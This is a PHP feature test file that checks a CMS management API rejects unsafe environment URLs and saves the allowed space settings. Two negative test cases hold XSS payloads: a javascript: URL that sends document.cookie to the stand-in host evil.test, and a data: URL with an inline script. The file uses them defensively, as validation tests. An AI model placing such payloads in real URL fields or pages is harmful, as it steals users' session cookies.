<?php

namespace Tests\Feature\Mgmt;

use App\Models\Management\Space;
use App\Models\User;
use Illuminate\Foundation\Testing\LazilyRefreshDatabase;
use PHPUnit\Framework\Attributes\Test;
use Tests\TestCase;
use Tests\Traits\SpaceTestingTrait;

/**
 * Environment URLs are loaded as an iframe src in the admin console and passed
 * to window.open, so an active-content scheme stored here would run script in
 * the console's own origin for every editor who opened a preview.
 */
class SpaceEnvironmentSettingsTest extends TestCase
{
    use LazilyRefreshDatabase;
    use SpaceTestingTrait;

    protected User $owner;

    protected Space $space;

    protected function setUp(): void
    {
        parent::setUp();

        $this->owner = User::factory()->create();
        $this->space = Space::factory()->withLive()->create();
        $this->assignSpaceRole($this->space, $this->owner, 'owner');
        $this->setUpSpaceTesting($this->space);
    }

    #[Test]
    public function a_valid_environment_is_accepted(): void
    {
        $this->actingAs($this->owner)
            ->patchJson(route('mgmt.spaces.update', $this->space), [
                'settings' => [
                    'environments' => [
                        ['name' => 'Preview', 'url' => 'https://preview.example.com'],
                    ],
                ],
            ])
            ->assertOk()
            ->assertJsonPath('data.settings.environments.0.name', 'Preview')
            ->assertJsonPath('data.settings.environments.0.url', 'https://preview.example.com');
    }

    #[Test]
    public function a_javascript_environment_url_is_rejected(): void
    {
        $this->actingAs($this->owner)
            ->patchJson(route('mgmt.spaces.update', $this->space), [
                'settings' => [
                    'environments' => [
                        ['name' => 'Preview', 'url' => 'javascript:fetch("//evil.test/"+document.cookie)'],
                    ],
                ],
            ])
            ->assertStatus(422)
            ->assertJsonValidationErrors(['settings.environments.0.url']);
    }

    #[Test]
    public function a_data_environment_url_is_rejected(): void
    {
        $this->actingAs($this->owner)
            ->patchJson(route('mgmt.spaces.update', $this->space), [
                'settings' => [
                    'environments' => [
                        ['name' => 'Preview', 'url' => 'data:text/html,<script>alert(1)</script>'],
                    ],
                ],
            ])
            ->assertStatus(422)
            ->assertJsonValidationErrors(['settings.environments.0.url']);
    }

    #[Test]
    public function an_empty_environment_url_is_rejected(): void
    {
        $this->actingAs($this->owner)
            ->patchJson(route('mgmt.spaces.update', $this->space), [
                'settings' => [
                    'environments' => [
                        ['name' => 'Preview', 'url' => ''],
                    ],
                ],
            ])
            ->assertStatus(422)
            ->assertJsonValidationErrors(['settings.environments.0.url']);
    }

    /**
     * Settings without a rule of their own used to be dropped by validated(),
     * so the editor settings page could not save any of these at all.
     */
    #[Test]
    public function settings_beyond_the_hand_listed_ones_are_persisted(): void
    {
        $this->actingAs($this->owner)
            ->patchJson(route('mgmt.spaces.update', $this->space), [
                'settings' => [
                    'visual_editor' => false,
                    'search_driver' => 'opensearch',
                    'slug_strategy' => 'always_prepend',
                    'default_environment' => 'Preview',
                ],
            ])
            ->assertOk()
            ->assertJsonPath('data.settings.visual_editor', false)
            ->assertJsonPath('data.settings.search_driver', 'opensearch')
            ->assertJsonPath('data.settings.slug_strategy', 'always_prepend')
            ->assertJsonPath('data.settings.default_environment', 'Preview');
    }

    #[Test]
    public function an_unknown_settings_key_is_not_written(): void
    {
        $this->actingAs($this->owner)
            ->patchJson(route('mgmt.spaces.update', $this->space), [
                'settings' => ['made_up_key' => 'value'],
            ])
            ->assertOk()
            ->assertJsonMissingPath('data.settings.made_up_key');
    }
}
